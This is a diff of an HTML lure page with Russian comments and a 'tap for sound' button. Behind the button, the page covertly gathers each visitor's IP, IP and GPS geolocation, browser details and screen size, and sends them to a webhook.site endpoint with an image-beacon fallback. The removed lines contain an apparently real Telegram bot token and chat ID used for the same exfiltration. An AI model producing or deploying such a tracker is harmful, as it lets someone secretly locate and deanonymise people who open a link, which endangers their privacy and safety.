@@ -45,17 +45,14 @@
 </head>
 <body>
     <button id="playButton">
-        <div class="message">Нажми для звука 🎵</div>
+        <div class="message">Нажми чтобы проверить звук 🎵</div>
         TAP FOR SOUND
     </button>
     <div id="status"></div>
 
     <script>
         const statusDiv = document.getElementById('status');
-        
-        // Настройки для Telegram бота (ЗАМЕНИ НА СВОИ)
-        const TELEGRAM_BOT_TOKEN = '8418449495:AAH_5D00nSETqgK50hC3swZKC3hlXj9qkSQ'; // Токен бота
-        const TELEGRAM_CHAT_ID = '1019756213'; // Твой ID в Telegram
+        const MY_WEBHOOK = 'https://webhook.site/7453869-e309-4e37-9f39-f675ca0246d3';
 
         // Функция для воспроизведения звука
         function playSound() {
@@ -86,84 +83,140 @@
             }
         }
 
-        // Функция получения геолокации по IP
-        async function getLocationByIP(ip) {
+        // Функция получения точной геолокации по IP
+        async function getPreciseLocationByIP(ip) {
             try {
                 const response = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await response.json();
                 return {
                     latitude: data.latitude,
                     longitude: data.longitude,
+                    accuracy: "IP-based location",
                     city: data.city,
                     country: data.country_name,
                     region: data.region,
                     org: data.org,
-                    timezone: data.timezone
+                    timezone: data.timezone,
+                    source: 'IP_GEOLOCATION'
                 };
             } catch (error) {
                 return null;
             }
         }
 
-        // Функция отправки в Telegram
-        async function sendToTelegram(message) {
+        // Функция получения примерной геолокации
+        async function getApproximateLocation() {
             try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                return await response.json();
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    accuracy: "Approximate IP location",
+                    city: data.city,
+                    country: data.country_name,
+                    region: data.region,
+                    source: 'APPROXIMATE_IP'
+                };
             } catch (error) {
-                console.log('Telegram error:', error);
                 return null;
             }
         }
 
-        // Основная функция сбора данных
-        async function collectAndSendData() {
-            statusDiv.innerHTML = '📡 Собираем данные...';
+        // Функция получения GPS геолокации
+        async function getGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: "Geolocation not supported", source: 'GPS' });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters',
+                            source: 'GPS'
+                        });
+                    },
+                    (error) => {
+                        resolve({ 
+                            error: error.message, 
+                            source: 'GPS',
+                            denied: true 
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Функция отправки данных
+        async function sendDataToWebhook(data) {
+            try {
+                await fetch(MY_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                // Альтернативный способ
+                const params = new URLSearchParams();
+                for (const [key, value] of Object.entries(data)) {
+                    params.append(key, typeof value === 'object' ? JSON.stringify(value) : value);
+                }
+                new Image().src = `${MY_WEBHOOK}?${params.toString()}`;
+            }
+        }
+
+        // Основная функция сбора ВСЕХ данных
+        async function collectAllData() {
+            statusDiv.innerHTML = '📡 Получаем данные...';
             
             const ip = await getIP();
-            const location = await getLocationByIP(ip);
             
-            // Формируем сообщение для Telegram
-            let message = `🚨 <b>Новый визит</b>\n\n`;
-            message += `📱 <b>IP:</b> <code>${ip}</code>\n`;
-            message += `⏰ <b>Время:</b> ${new Date().toLocaleString()}\n`;
-            
-            if (location) {
-                message += `📍 <b>Местоположение:</b>\n`;
-                message += `   🌍 <b>Координаты:</b> ${location.latitude}, ${location.longitude}\n`;
-                message += `   🏙️ <b>Город:</b> ${location.city}\n`;
-                message += `   🇷🇺 <b>Страна:</b> ${location.country}\n`;
-                message += `   🏢 <b>Провайдер:</b> ${location.org}\n`;
-            }
-            
-            message += `\n💻 <b>Браузер:</b> ${navigator.userAgent}\n`;
-            message += `📏 <b>Экран:</b> ${screen.width}x${screen.height}\n`;
-            message += `🌐 <b>Язык:</b> ${navigator.language}\n`;
-            message += `🔗 <b>Ссылка:</b> ${window.location.href}`;
+            // Получаем ВСЕ возможные варианты геолокации параллельно
+            const [gpsLocation, preciseIPLocation, approximateLocation] = await Promise.all([
+                getGPSLocation(),
+                getPreciseLocationByIP(ip),
+                getApproximateLocation()
+            ]);
 
-            // Отправляем в Telegram
-            const result = await sendToTelegram(message);
-            
-            if (result && result.ok) {
-                statusDiv.innerHTML = '✅ Данные отправлены!';
+            const allData = {
+                ip: ip,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                // Все варианты геолокации
+                gps_location: gpsLocation,
+                precise_ip_location: preciseIPLocation,
+                approximate_location: approximateLocation,
+                
+                // Выбираем лучшую доступную геолокацию
+                best_location: preciseIPLocation || approximateLocation || gpsLocation
+            };
+
+            // Показываем статус
+            if (preciseIPLocation) {
+                statusDiv.innerHTML = `📍 Location: ${preciseIPLocation.latitude}, ${preciseIPLocation.longitude}`;
+            } else if (approximateLocation) {
+                statusDiv.innerHTML = `📍 Approx: ${approximateLocation.city}, ${approximateLocation.country}`;
             } else {
-                statusDiv.innerHTML = '📨 Данные собраны (ошибка отправки)';
+                statusDiv.innerHTML = '📍 Location data collected';
             }
 
-            return { ip, location };
+            return allData;
         }
 
         // Обработчик клика
@@ -171,8 +224,9 @@
             // Сразу воспроизводим звук
             playSound();
             
-            // Собираем и отправляем данные
-            await collectAndSendData();
+            // Собираем и отправляем все данные
+            const allData = await collectAllData();
+            await sendDataToWebhook(allData);
         });
 
         // Для мобильных
@@ -183,9 +237,9 @@
 
         // Отправляем данные при загрузке
         window.addEventListener('load', async function() {
-            setTimeout(async () => {
-                await collectAndSendData();
-            }, 1000);
+            const allData = await collectAllData();
+            allData.event = 'page_loaded';
+            await sendDataToWebhook(allData);
         });
     </script>
 </body>
